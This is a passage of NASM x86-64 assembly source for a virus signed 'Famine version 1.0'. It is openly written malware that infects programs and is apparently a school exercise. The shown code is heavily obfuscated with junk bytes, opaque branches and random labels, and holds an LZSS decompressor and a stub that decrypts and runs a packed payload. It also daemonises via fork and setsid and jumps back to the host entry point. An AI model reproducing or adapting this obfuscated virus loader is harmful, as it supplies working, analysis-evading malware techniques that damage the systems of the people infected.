; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Famine version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 4 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _UEC_OFF
    .mapaddr    resq 0x1
endstruc
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@4KQ5NUgn9FAC
..@9nMTioiGiftu:
    jnz         ..@DJY6EmC0BsxF
    jmp         $+5
db 0xb0, 0xfa, 0xc0
    js          ..@8SZmnd3y26O9
    jns         ..@8SZmnd3y26O9
..@FmHY9P1z1Lx9:
%ifdef X86_32
    push        ebp
    mov         rsp, rsp
    xor         ebp, ebp
%endif
    jmp         $+4
db 0x6a, 0x4c
    jb          ..@hGjUkY52ctFG
    jae         ..@hGjUkY52ctFG
..@plADiNNNJ5zy:
    pop         rsi
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         $+3
db 0x6f
    jmp         ..@VjAbp6RYKQ65
..@MEFGEDsVCkKV:
    pop         rax
    mov         rbx, rsi
    add         bx, cx
    jmp         ..@icZcmkgaxmh7
..@2OSOsGBVznW7:
    shl         eax, 1
    push        rdi
    pop         rdi
    jmp         $+5
db 0xf0, 0x24, 0xa7
    je          ..@145ueLqhkG3a
    jne         ..@145ueLqhkG3a
..@bjGQOmHW1Rol:
    DESTROY_MX_VAR
    mov         rax, SYS_EXIT
    syscall
    je          ..@TVNF6YjVF5XV
    jne         ..@TVNF6YjVF5XV
..@BQb9lmpRxBhY:
    mov         m4, rdi
    xor         r1, r1
    jmp         ..@Jv3tuc5iQK7P
..@Z2iawj5pXRzJ:
    xor         r3, r3
    jmp         $+5
db 0x39, 0xc8, 0x11
    jl          ..@TWUTCl6bRV2W
    jge         ..@TWUTCl6bRV2W
..@xC8KSntYuCzP:
    call        rax
    js          ..@A2kz9j3fSbAz
    jns         ..@A2kz9j3fSbAz
..@wRl3ftG4aAMT:
    mov         rcx, rcx
    add         rdi, bytes
    jb          ..@fBOIdAGXZzaE
    jae         ..@fBOIdAGXZzaE
..@HzuqKzI4wCA4:
    push        rax
    jl          ..@MEFGEDsVCkKV
    jge         ..@MEFGEDsVCkKV
..@mgxSTDOvm5yc:
    jz          ..@nC2Fi2ltufEW
    push        rsi
    pop         rsi
    jmp         $+3
db 0x2e
    js          ..@POXXIxDK4Q79
    jns         ..@POXXIxDK4Q79
..@U2eVSSEvya82:
    xor         rax, rax
    js          ..@8rVNw2qg5V6q
    jns         ..@8rVNw2qg5V6q
..@WxOIbf2uktPD:
    mov         rcx, LENGTH_BITS
    jmp         $+5
db 0xf0, 0x73, 0x3e
    jmp         $+3
db 0xc1
    jmp         $+3
db 0x67
    js          ..@fYzuLcZvu2Ij
    jns         ..@fYzuLcZvu2Ij
..@4HHuKnJ18sSY:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    js          ..@2ygi9rA9du7W
    jns         ..@2ygi9rA9du7W
..@sdKyAOJcmVpb:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jmp         ..@I6qEgns1mHMZ
..@DJY6EmC0BsxF:
    mov         al, BYTE [r1]
    jmp         $+5
db 0xaf, 0xfa, 0x98
    jl          ..@BQQKYFljWJpk
    jge         ..@BQQKYFljWJpk
..@2D78UrqANYCo:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    jmp         $+3
db 0x45
    jmp         $+3
db 0x5c
    jmp         ..@OKWWvBexOj3q
..@Gd7NTXtTVXAe:
    mov         r1, r5
    GGLOBAL     virus_len
    push        rdi
    jmp         ..@PKn0CtUnKNfg
..@d8nVIlsTlcSv:
    mov         r2, original_virus_len-non_packed_len
    jmp         $+3
db 0x75
    jmp         $+5
db 0x99, 0xdf, 0x44
    jmp         ..@KTak4ih6qZJn
..@KTjsSkgqsY4b:
    jmp         ..@u9EqhCANOotU
    jmp         ..@ngiUnrtNleIk
..@hGjUkY52ctFG:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         $+5
db 0x2b, 0x88, 0xde
    je          ..@e5IQMexcOE8W
    jne         ..@e5IQMexcOE8W
..@N2ef8dddKnCA:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jl          ..@tdiE4mHqPoC4
    jge         ..@tdiE4mHqPoC4
..@MOiOba0VWtsm:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    je          ..@pMWyCjA3mYjf
    jne         ..@pMWyCjA3mYjf
..@LzBtTIawt7Dn:
    jg          ..@t4N4ig4jTzbe
    jb          ..@9qB5HIc4RfJs
    jae         ..@9qB5HIc4RfJs
..@Vy2wip7CQleE:
    je          ..@txFGTsJ8rhWq
    jmp         $+3
db 0xb7
    jmp         $+3
db 0xbd
    jmp         ..@2cHGdEMHEBLY
..@O1D8dhNo4QEQ:
    GGLOBAL     entrypoint
    jmp         ..@JXtlrrvi3u0U
..@6nWWWAiZkzpO:
    cmp         eax, 0x0
    jmp         $+4
db 0x27, 0xee
    jmp         ..@DCfRLy0PinIy
..@XgPmmcH8qXN2:
    pop         rax
    jmp         $+3
db 0xe2
    jl          ..@kFVuxnPdNxFA
    jge         ..@kFVuxnPdNxFA
..@jcRvJQ95pbNR:
    call        ..@0hinfPmyOxsr
    jmp         $+4
db 0x00, 0x6d
    je          ..@NTW5iSkOM4uv
    jne         ..@NTW5iSkOM4uv
..@kE1YlOYTb4NW:
    and         bx, WINDOW_LENGTH-1
    push        rsi
    jmp         $+3
db 0x2b
    jmp         ..@plADiNNNJ5zy
..@yBBiRCHwQKPO:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    jb          ..@SBfKo0mmAxTb
    jae         ..@SBfKo0mmAxTb
..@d2o4KtTGsWsN:
    cmp         QWORD [r5], 0x0000000000000000
    jmp         $+4
db 0xf7, 0x04
    jl          ..@Vy2wip7CQleE
    jge         ..@Vy2wip7CQleE
..@bKNnqqZkDdKz:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    jl          ..@1nvtDilH4Qwr
    jge         ..@1nvtDilH4Qwr
..@mwu8Ab53Kwft:
    mov         rdx, rax
    xor         rax, rax
    xor         rcx, rcx
    jmp         $+4
db 0x6b, 0x1a
    js          ..@AW8vKG1iu0zb
    jns         ..@AW8vKG1iu0zb
..@47Fp72BIEoiZ:
    pop         rbx
    jmp         $+4
db 0x81, 0xac
    jb          ..@mgxSTDOvm5yc
    jae         ..@mgxSTDOvm5yc
..@iLZRQAW7iDDR:
%ifdef X86_64
    pop         rsi
%endif
    jmp         $+4
db 0xc3, 0x4e
    jmp         ..@2nmytgMPIudK
..@HR1A5DmIUNXo:
    GGLOBAL     virus_len
    mov         rdx, rdx
    jb          ..@LvKxX5xw8Szr
    jae         ..@LvKxX5xw8Szr
..@SCmQdtLmHk7p:
    sub         al, BYTE [r2]
    jl          ..@zsZUAMCDMvSE
    jge         ..@zsZUAMCDMvSE
..@1Lr6ovuKV6bm:
    add         rax, 1
    jmp         $+3
db 0x14
    js          ..@3zZ22nSXGkwJ
    jns         ..@3zZ22nSXGkwJ
..@SZh5pMPv9wRg:
    push        rbx
    jmp         ..@47Fp72BIEoiZ
..@WceRoJ05E3w6:
    GGLOBAL     entrypoint
    jmp         $+5
db 0x63, 0x0e, 0xc6
    je          ..@d2o4KtTGsWsN
    jne         ..@d2o4KtTGsWsN
..@L1QNmyPkIP8V:
%ifdef X86_32
    mov         edx, 111b
%endif
    jb          ..@sdKyAOJcmVpb
    jae         ..@sdKyAOJcmVpb
..@2ygi9rA9du7W:
    GGLOBAL     _packed
    jmp         $+5
db 0x6b, 0xb0, 0x69
    jmp         $+4
db 0x32, 0xd4
    jmp         $+3
db 0x5a
    jmp         ..@Gd7NTXtTVXAe
..@ngiUnrtNleIk:
    mov         rcx, POSITION_BITS
    call        ..@0hinfPmyOxsr
    jl          ..@ZIVPqZzeGf61
    jge         ..@ZIVPqZzeGf61
..@WE5TzZbgSMGx:
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    test        dl, dl
    jmp         $+3
db 0x29
    jmp         ..@mRMZSpZTrfLU
..@0H2E7PnMrnUu:
    jne         ..@eq5lI2aGHbUM
    GGLOBAL     _packed
    mov         m8, r5
    jmp         $+3
db 0x2e
    jb          ..@0GDTdiFzcZu9
    jae         ..@0GDTdiFzcZu9
..@8rVNw2qg5V6q:
    push        rax
    pop         rax
    cmp         BYTE [r1 + rax], 0x0
    jmp         $+3
db 0xd9
    jmp         $+3
db 0x3b
    jmp         ..@VTKR3QT9HyXB
..@at0vPBiTFBSz:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         ..@byGxiIoG9mCZ
..@WwnjaM3VUHLB:
    call        ..@0hinfPmyOxsr
    jmp         $+3
db 0x46
    jmp         $+5
db 0x16, 0xd9, 0x98
    jmp         $+5
db 0x21, 0xe3, 0x83
    jmp         $+5
db 0x17, 0x29, 0x27
    jmp         ..@TTXpFQJBaU6h
..@tqMCo2XA1iJd:
    sub         r1, QWORD [r5]
    DESTROY_MX_VAR
    mov         rax, r1
    jmp         $+5
db 0x6f, 0xd7, 0x73
    jmp         $+3
db 0x77
    jb          ..@PgRT6gtQDk92
    jae         ..@PgRT6gtQDk92
..@OmvrI5UfNFfZ:
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    call        LzssDecoder
    js          ..@89LRU05No9z4
    jns         ..@89LRU05No9z4
..@Zwnv0hp9ENud:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    inc         DWORD [rsp+_LZSSD_OFF.index]
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jb          ..@KTjsSkgqsY4b
    jae         ..@KTjsSkgqsY4b
..@JL8i0PYy6Gkj:
    xor         rax, rax
    js          ..@gWi4TYuhwfnS
    jns         ..@gWi4TYuhwfnS
..@VTKR3QT9HyXB:
    jz          ..@LJQoP1aSz7U1
    jmp         $+4
db 0x28, 0x36
    jmp         ..@1Lr6ovuKV6bm
..@AW8vKG1iu0zb:
    xor         rdi, rdi
    je          ..@HzuqKzI4wCA4
    jne         ..@HzuqKzI4wCA4
..@POXXIxDK4Q79:
    mov         r1, rax
    jmp         $+5
db 0x36, 0xf9, 0x61
    jb          ..@Je85h6h7SDci
    jae         ..@Je85h6h7SDci
..@PgRT6gtQDk92:
    xor         r1, r1
    xor         r2, r2
    jmp         ..@Z2iawj5pXRzJ
..@Z8lNf28n3qfr:
    sub         rsp, _UEC_OFF_size
    call        ExitProgram
    jmp         $+4
db 0xa1, 0x14
    jmp         LzssDecoder
..@mRMZSpZTrfLU:
    jz          ..@yBBiRCHwQKPO
    or          eax, 1
    mov         rbx, rbx
    jmp         ..@yBBiRCHwQKPO
..@A2kz9j3fSbAz:
    xor         rax, rax
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         ..@d8nVIlsTlcSv
..@BtuMc3M945ky:
    xor         r5, r5
    jmp         $+5
db 0xf7, 0x5a, 0xdc
    jmp         $+3
db 0xa2
    jmp         ..@mpmHElafG28S
..@e5IQMexcOE8W:
%ifdef X86_32
    int         0x80
    pop         ebp
%endif
    jmp         $+5
db 0x1c, 0x39, 0x8e
    js          ..@c9VbTTiAhPcR
    jns         ..@c9VbTTiAhPcR
..@oxwOx6PJT7i2:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    js          ..@fgXBXNvNiQJu
    jns         ..@fgXBXNvNiQJu
..@Je85h6h7SDci:
    xor         r2, r2
    jmp         $+3
db 0x22
    jmp         ..@8n3ABAKbRkEV
..@icZcmkgaxmh7:
    push        rax
    jl          ..@XgPmmcH8qXN2
    jge         ..@XgPmmcH8qXN2
..@NTW5iSkOM4uv:
    xor         rdi, rdi
    jb          ..@BZYmOxZ8X01o
    jae         ..@BZYmOxZ8X01o
..@mpmHElafG28S:
    jmp         rax
    jmp         $+3
db 0xd3
    jmp         ..@nC2Fi2ltufEW
..@0hinfPmyOxsr:
    pop         rdi
    jmp         ..@JL8i0PYy6Gkj
..@TWUTCl6bRV2W:
    xor         r4, r4
    jmp         $+4
db 0x4b, 0x21
    jb          ..@BtuMc3M945ky
    jae         ..@BtuMc3M945ky
..@6fX7XVwLFWMu:
    pop         rdi
    push        rdi
    ret
    jmp         $+3
db 0xfc
    js          ..@YwgJ1060BpqJ
    jns         ..@YwgJ1060BpqJ
..@fBOIdAGXZzaE:
    cmp         QWORD [rdi], 0x00
    jne         ..@wRl3ftG4aAMT
    jmp         $+3
db 0xb1
    js          ..@qoHOybsgfYyZ
    jns         ..@qoHOybsgfYyZ
..@TdZJu2fQyQ7Y:
    mov         rbx, rbx
    jmp         $+4
db 0x7a, 0xf9
    jl          ..@nB3HQMQsnxh0
    jge         ..@nB3HQMQsnxh0
..@ckb38vOhuddc:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jb          ..@vRq4B0b7scGw
    jae         ..@vRq4B0b7scGw
..@vu0B3S8WLUqn:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    je          ..@ckb38vOhuddc
    jne         ..@ckb38vOhuddc
..@YcaE1Cdzq5WO:
%ifdef X86_64
    mov         eax, SYS_MMAP
    push        rsi
%endif
    jmp         $+4
db 0x06, 0xb1
    jl          ..@iLZRQAW7iDDR
    jge         ..@iLZRQAW7iDDR
..@3XBlBuEeBg1E:
    pop         rdx
    jmp         $+5
db 0x1f, 0x4c, 0x7b
    jl          ..@oPUHcl85kFyh
    jge         ..@oPUHcl85kFyh
..@EH4UJCx7PxK5:
    syscall
    jmp         ..@z3wtgANMj15M
..@mRfx42UgvUGt:
    push        r3
    jmp         $+4
db 0x9e, 0x1b
    js          ..@wsmIxlKVB9pT
    jns         ..@wsmIxlKVB9pT
..@PKn0CtUnKNfg:
    pop         rdi
    jmp         ..@sq4eHOjW0qtT
..@tdiE4mHqPoC4:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+5
db 0xec, 0x52, 0xc9
    je          ..@e2ZF2GYNJA2P
    jne         ..@e2ZF2GYNJA2P
..@145ueLqhkG3a:
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    jmp         $+4
db 0xea, 0x2e
    jl          ..@WE5TzZbgSMGx
    jge         ..@WE5TzZbgSMGx
..@2cHGdEMHEBLY:
    xor         rax, rax
    mov         rax, SYS_FORK
    syscall
    jmp         $+4
db 0x35, 0xca
    jmp         ..@6nWWWAiZkzpO
..@Qg1JjH0JZL7T:
    mov         rdi, rdi
    jmp         ..@mwu8Ab53Kwft
..@wz5bV18gRkpD:
    xor         r3, r3
    xor         r4, r4
    jmp         $+4
db 0x9b, 0x47
    jmp         $+4
db 0xe1, 0x6b
    jmp         ..@WceRoJ05E3w6
..@S9Jikn4k1na2:
    xor         r2, r2
    xchg        rcx, rcx
    xor         r3, r3
    jmp         $+5
db 0xf6, 0x8b, 0x5b
    jmp         $+4
db 0xfa, 0x53
    jmp         ..@xK2QFSVq8Y4N
..@8SZmnd3y26O9:
    xor         rax, rax
    je          ..@DdFCQqLXbh0H
    jne         ..@DdFCQqLXbh0H
..@SJUN28QGTDJt:
    pop         rsi
    jmp         $+4
db 0x5f, 0xe0
    jmp         ..@Vy8szSxeqimB
..@vRq4B0b7scGw:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    jmp         $+4
db 0xe4, 0x64
    jl          ..@2OSOsGBVznW7
    jge         ..@2OSOsGBVznW7
..@QKBp2NKsmeWH:
    push        rcx
    pop         rcx
    add         rsp, bytes
    jl          ..@DN2QOvKTSKzB
    jge         ..@DN2QOvKTSKzB
..@atzeETbffL5H:
    add         r1, 1
    add         r2, 1
    dec         r3
    jmp         ..@9nMTioiGiftu
..@nC2Fi2ltufEW:
    xor         rax, rax
    mov         eax, SYS_SETSID
    xchg        rdi, rdi
    jmp         $+5
db 0xa9, 0x7f, 0x49
    js          ..@EH4UJCx7PxK5
    jns         ..@EH4UJCx7PxK5
..@u9EqhCANOotU:
    mov         rcx, 1
    jmp         $+5
db 0x14, 0x8b, 0x4e
    jmp         ..@WwnjaM3VUHLB
..@FHaFLyOYcdk0:
    ret
    je          DecryptExecutableCode
    jne         DecryptExecutableCode
..@QHfdnzYJvCav:
    add         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0xc8, 0x61, 0x55
    jmp         $+4
db 0xf0, 0xd3
    jmp         $+4
db 0x66, 0x32
    js          ..@AevLUldLdLrj
    jns         ..@AevLUldLdLrj
..@txFGTsJ8rhWq:
    jmp         DecryptExecutableCode
    jl          ExitProgram
    jge         ExitProgram
..@t4N4ig4jTzbe:
    test        rax, rax
    jz          ..@ngiUnrtNleIk
    jmp         $+5
db 0xe7, 0x8f, 0x15
    jb          ..@ENn2QKfHP3M5
    jae         ..@ENn2QKfHP3M5
..@xK2QFSVq8Y4N:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
%endif
    jl          ..@L1QNmyPkIP8V
    jge         ..@L1QNmyPkIP8V
Strlen:
    jmp         ..@U2eVSSEvya82
..@PiuIvZjCapzC:
    INIT_MX_VAR
    jmp         $+4
db 0x09, 0x84
    jmp         $+5
db 0xc9, 0x92, 0xa6
    js          ..@BMsAgK1icRny
    jns         ..@BMsAgK1icRny
..@e2ZF2GYNJA2P:
    push        rbx
    jmp         $+3
db 0x73
    js          ..@gpe4bq6FqfSs
    jns         ..@gpe4bq6FqfSs
..@nB3HQMQsnxh0:
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+4
db 0x4e, 0xd6
    jmp         ..@LzBtTIawt7Dn
..@gpe4bq6FqfSs:
    pop         rbx
    js          ..@uyFB8GauvY0M
    jns         ..@uyFB8GauvY0M
..@tE1IT1prJ0gL:
    mov         r1, r5
    je          ..@O1D8dhNo4QEQ
    jne         ..@O1D8dhNo4QEQ
..@mdWNhssWd0hJ:
    mov         BYTE [rbx], al
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    xor         rdi, rdi
    jmp         $+3
db 0x27
    jmp         $+4
db 0x2f, 0x8e
    jb          ..@N2ef8dddKnCA
    jae         ..@N2ef8dddKnCA
..@vwuNGyUk9sEE:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    js          ..@MOiOba0VWtsm
    jns         ..@MOiOba0VWtsm
..@hwkegRjC68ys:
    pop         rbx
    jmp         $+3
db 0x0f
    jmp         $+5
db 0x6b, 0x90, 0x7a
    jl          ..@kE1YlOYTb4NW
    jge         ..@kE1YlOYTb4NW
..@oPUHcl85kFyh:
    mov         rcx, 8
    jb          ..@jcRvJQ95pbNR
    jae         ..@jcRvJQ95pbNR
..@fYzuLcZvu2Ij:
    rep         nop
    call        ..@0hinfPmyOxsr
    add         rax, 1
    jmp         $+5
db 0x3b, 0x15, 0xbc
    jmp         $+3
db 0x3a
    jl          ..@cHLqwRrROEjz
    jge         ..@cHLqwRrROEjz
..@sq4eHOjW0qtT:
    xor         r2, r2
    mov         r2d, DWORD [r5]
    sub         r2, non_packed_len
    jmp         $+3
db 0x65
    js          ..@OmvrI5UfNFfZ
    jns         ..@OmvrI5UfNFfZ
..@qoHOybsgfYyZ:
    xchg        rbx, rbx
    add         rdi, bytes
    jmp         $+5
db 0x89, 0x60, 0xd6
    js          ..@BQb9lmpRxBhY
    jns         ..@BQb9lmpRxBhY
DecryptExecutableCode:
    jmp         ..@HR1A5DmIUNXo
..@DN2QOvKTSKzB:
    GGLOBAL     _start
    jb          ..@tE1IT1prJ0gL
    jae         ..@tE1IT1prJ0gL
..@TTXpFQJBaU6h:
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    jmp         ..@TdZJu2fQyQ7Y
..@kFVuxnPdNxFA:
    push        rbx
    jmp         $+5
db 0x36, 0xa4, 0x6e
    jl          ..@hwkegRjC68ys
    jge         ..@hwkegRjC68ys
..@DdFCQqLXbh0H:
    pop         r3
    pop         r2
    pop         r1
    jmp         ..@FHaFLyOYcdk0
..@YwgJ1060BpqJ:
    xchg        rsp, rsp
    jmp         $+3
db 0x4f
    js          ..@QHfdnzYJvCav
    jns         ..@QHfdnzYJvCav
..@cpoNPEGhfqRh:
    syscall
    js          ..@Z8lNf28n3qfr
    jns         ..@Z8lNf28n3qfr
..@fgXBXNvNiQJu:
    xchg        rbx, rbx
    xchg        rcx, rcx
    push        rbx
    jmp         $+5
db 0x1a, 0xcb, 0xcd
    jb          ..@9Uwt2fZocTBY
    jae         ..@9Uwt2fZocTBY
..@2nmytgMPIudK:
%ifdef X86_64
    syscall
%endif
    je          ..@4HHuKnJ18sSY
    jne         ..@4HHuKnJ18sSY
..@Jv3tuc5iQK7P:
    xor         r2, r2
    jmp         ..@wz5bV18gRkpD
..@0GDTdiFzcZu9:
    call        Processes
    xor         r1, r1
    call        ExitProgram
    js          ..@eq5lI2aGHbUM
    jns         ..@eq5lI2aGHbUM
..@sPKeUatnF1tu:
    mov         rax, SYS_WAIT4
    jmp         $+3
db 0xe3
    jmp         $+5
db 0x94, 0x2c, 0x24
    jmp         $+5
db 0x53, 0xe4, 0xc4
    js          ..@5YzYjbErOH2Z
    jns         ..@5YzYjbErOH2Z
..@9kVX4vvytxIC:
    jnz         ..@2D78UrqANYCo
    jb          ..@IcE1FsFg1syp
    jae         ..@IcE1FsFg1syp
..@SBfKo0mmAxTb:
    sub         rcx, 1
    jmp         $+3
db 0xbb
    jmp         $+5
db 0xb2, 0xe5, 0x9a
    jmp         $+5
db 0x0a, 0x12, 0x83
    jmp         ..@9kVX4vvytxIC
..@BQQKYFljWJpk:
    cmp         BYTE [r2], al
    jmp         $+3
db 0x46
    je          ..@52jEseTk4LWw
    jne         ..@52jEseTk4LWw
..@tjrdaGrFmq78:
    xchg        rbx, rbx
    js          ..@Qg1JjH0JZL7T
    jns         ..@Qg1JjH0JZL7T
..@AevLUldLdLrj:
    ret
..@ef6RfpXyAdf8:
    xor         rbx, rbx
    jmp         $+5
db 0xd8, 0x17, 0x68
    jmp         $+5
db 0x11, 0x13, 0xb5
    jmp         ..@2D78UrqANYCo
Strncmp:
    jmp         ..@cvzb0UcsM6z1
..@Ej3FXi4ITK67:
    sub         rsp, _LZSSD_OFF_size
    je          ..@LJnwTLCf4Fuc
    jne         ..@LJnwTLCf4Fuc
..@MmmXFQvTfxwz:
    mov         rax, SYS_FORK
    syscall
    test        eax, eax
    jl          ..@At4XoMclPWf3
    jge         ..@At4XoMclPWf3
..@9qB5HIc4RfJs:
    jmp         ..@YwgJ1060BpqJ
    jmp         ..@0hinfPmyOxsr
..@byGxiIoG9mCZ:
    mov         dl, BYTE [rbx]
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    jmp         $+5
db 0xa7, 0xcc, 0x08
    jl          ..@vu0B3S8WLUqn
    jge         ..@vu0B3S8WLUqn
..@70iuqw7R2twL:
    mov         rax, rax
    jmp         $+4
db 0xa8, 0xe4
    jmp         $+4
db 0x0a, 0x37
    jb          ..@cpoNPEGhfqRh
    jae         ..@cpoNPEGhfqRh
..@YQpLJ4U7uxE8:
    push        r2
    mov         rsi, rsi
    jl          ..@mRfx42UgvUGt
    jge         ..@mRfx42UgvUGt
..@F6BfAUhko3Xf:
    jmp         ..@u9EqhCANOotU
    jl          ..@t4N4ig4jTzbe
    jge         ..@t4N4ig4jTzbe
..@LJQoP1aSz7U1:
    ret
    jmp         $+5
db 0x0a, 0x9d, 0x39
    je          Strncmp
    jne         Strncmp
..@At4XoMclPWf3:
    jz          ..@txFGTsJ8rhWq
    jmp         ..@h0NOzSkMCUtR
..@z3wtgANMj15M:
    xor         rax, rax
    jl          ..@MmmXFQvTfxwz
    jge         ..@MmmXFQvTfxwz
..@89LRU05No9z4:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         m8, rax
    jb          ..@xC8KSntYuCzP
    jae         ..@xC8KSntYuCzP
..@jYh6lpcLy7wP:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         ..@YcaE1Cdzq5WO
..@IcE1FsFg1syp:
    push        rdi
    push        rbx
    js          ..@0DlsA42QeGSr
    jns         ..@0DlsA42QeGSr
..@iCeV6CJkzxmZ:
    add         ecx, 1
    cmp         cl, dl
    jmp         ..@ntodWFTQDgbM
..@4KQ5NUgn9FAC:
    pop         rdi
    sub         rdi, 1
    sub         rdi, 0x5
    jmp         ..@PiuIvZjCapzC
..@cHLqwRrROEjz:
    xchg        rsp, rsp
    jmp         ..@tjrdaGrFmq78
..@I6qEgns1mHMZ:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+5
db 0x8b, 0xbf, 0x14
    js          ..@FmHY9P1z1Lx9
    jns         ..@FmHY9P1z1Lx9
..@hOm8LNm2igjS:
    pop         rsi
    jmp         $+5
db 0xc1, 0xb8, 0xb4
    jmp         $+3
db 0x77
    jmp         ..@SJUN28QGTDJt
..@BMsAgK1icRny:
    mov         vsp, rdi
    mov         rsi, rsi
    mov         rdi, rbp
    jb          ..@wRl3ftG4aAMT
    jae         ..@wRl3ftG4aAMT
..@Xar0gX1JEWTl:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    mov         rcx, rcx
    jmp         $+4
db 0x4e, 0x78
    jb          ..@uO6coQUvsQps
    jae         ..@uO6coQUvsQps
..@yfSYYfpCk7b7:
%ifdef X86_64
    mov         edx, 111b
    mov         r10, 0x22
%endif
    js          ..@jYh6lpcLy7wP
    jns         ..@jYh6lpcLy7wP
..@OKWWvBexOj3q:
    jnz         ..@2OSOsGBVznW7
    jmp         $+3
db 0x52
    jmp         $+4
db 0xad, 0x90
    js          ..@at0vPBiTFBSz
    jns         ..@at0vPBiTFBSz
..@TVNF6YjVF5XV:
    mov         rdx, rdx
    jmp         $+3
db 0xfd
    jl          Strlen
    jge         Strlen
..@LJnwTLCf4Fuc:
    rep         nop
    jmp         $+5
db 0x89, 0x4a, 0x3e
    js          ..@vwuNGyUk9sEE
    jns         ..@vwuNGyUk9sEE
..@KTak4ih6qZJn:
    mov         rax, SYS_MUNMAP
    jmp         ..@70iuqw7R2twL
..@ENn2QKfHP3M5:
    mov         rcx, rcx
    push        rsi
    push        rsi
    jmp         $+5
db 0x4e, 0xda, 0xb1
    jmp         ..@hOm8LNm2igjS
..@ntodWFTQDgbM:
    jle         ..@HzuqKzI4wCA4
    xchg        rsi, rsi
    jl          ..@u9EqhCANOotU
    jge         ..@u9EqhCANOotU
..@JXtlrrvi3u0U:
    rep         nop
    xchg        rbx, rbx
    jmp         $+3
db 0x18
    jmp         ..@tqMCo2XA1iJd
..@ZIVPqZzeGf61:
    mov         rsi, rax 
    jmp         $+4
db 0xba, 0xb6
    jmp         ..@WxOIbf2uktPD
ExitProgram:
    jmp         ..@bjGQOmHW1Rol
..@uyFB8GauvY0M:
    xchg        rdx, rdx
    xchg        rdx, rdx
    xchg        rsp, rsp
    jl          ..@iCeV6CJkzxmZ
    jge         ..@iCeV6CJkzxmZ
..@wsmIxlKVB9pT:
    xor         rax, rax
    je          ..@DJY6EmC0BsxF
    jne         ..@DJY6EmC0BsxF
..@cvzb0UcsM6z1:
    push        r1
    jmp         $+3
db 0x57
    jb          ..@YQpLJ4U7uxE8
    jae         ..@YQpLJ4U7uxE8
..@BZYmOxZ8X01o:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    jmp         $+3
db 0xb1
    jmp         $+4
db 0x44, 0x18
    jmp         $+3
db 0x79
    jl          ..@QAuFjFe6i9BP
    jge         ..@QAuFjFe6i9BP
..@eq5lI2aGHbUM:
    sub         rsp, _UEC_OFF_size
    xor         rax, rax
    jl          ..@df3FFyMrmQa2
    jge         ..@df3FFyMrmQa2
..@df3FFyMrmQa2:
    push        rcx
    pop         rcx
    xor         r1, r1
    jl          ..@S9Jikn4k1na2
    jge         ..@S9Jikn4k1na2
..@Vy8szSxeqimB:
    push        rdx
    jmp         $+4
db 0xf7, 0xca
    jmp         $+3
db 0xd3
    jb          ..@3XBlBuEeBg1E
    jae         ..@3XBlBuEeBg1E
..@gWi4TYuhwfnS:
    xor         rdx, rdx
    jmp         ..@ef6RfpXyAdf8
..@3zZ22nSXGkwJ:
    xchg        rsi, rsi
    jb          ..@BPTQLycKJRO8
    jae         ..@BPTQLycKJRO8
..@9Uwt2fZocTBY:
    pop         rbx
    jmp         ..@Xar0gX1JEWTl
..@QAuFjFe6i9BP:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
